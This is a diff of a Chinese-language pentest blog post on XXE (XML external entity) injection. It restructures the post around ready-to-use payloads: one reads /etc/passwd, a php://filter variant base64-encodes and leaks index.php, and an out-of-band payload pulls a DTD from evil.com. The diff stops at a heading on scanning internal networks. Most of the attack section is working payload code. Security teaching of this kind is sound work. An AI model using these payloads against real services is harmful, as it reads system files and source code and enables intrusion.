@@ -9,53 +9,30 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 XXE
-XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
-
 XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
 
-### 0x01 XML格式
-```xml
-<?xml version="1.0" encoding="utf-8"?>  <!--xml声明-->
+外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
 
-<!--文档类型定义-->
-<!DOCTYPE note [
-  <!ELEMENT note (to,from,heading,body)>
-  <!ELEMENT to       (#PCDATA)>
-  <!ELEMENT from     (#PCDATA)>
-  <!ELEMENT heading  (#PCDATA)>
-  <!ELEMENT body     (#PCDATA)>
-]>
-
-<!--文档元素-->
-<note>
-<to>Tom</to>
-<from>John</from>
-<heading>Reminder</heading>
-<body>Hi,I’am John</body>
-</note>
+### 0x03 XXE漏洞读取文件
 ```
-
-### 0x02 内部声明与外部引用
-```xml
-<!--内部声明实体-->
-<!ENTITY 实体名称 "实体的值">
-
-<!--引用外部实体-->
-<!ENTITY 实体名称 SYSTEM "URI">
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xdsec [
+  <!ELEMENT name ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+  <name>&xxe;</name>
+</root>
 ```
-
-### 0x03 XXE漏洞
-* 外部引用时可能会出现漏洞，几种payload：
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE a [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
-]>
-<test>&xxe;</test>
 ```
-<br>
-```xml
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xdsec [
+  <!ELEMENT name ANY >
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+```
 <?xml version="1.0"?>
 <!DOCTYPE a [
   <!ENTITY % d SYSTEM "http://evil.com/evil.dtd" >
@@ -72,19 +49,6 @@ evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 <test>&b;</test>
 
 evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
-```
-
-* 简单绕过
-
-```xml
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE xdsec [
-  <!ELEMENT methodname ANY >
-  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
-]>
-<methodcall>
-  <methodname>&xxe;</methodname>
-</methodcall>
 ```
 
 * 扫描内网
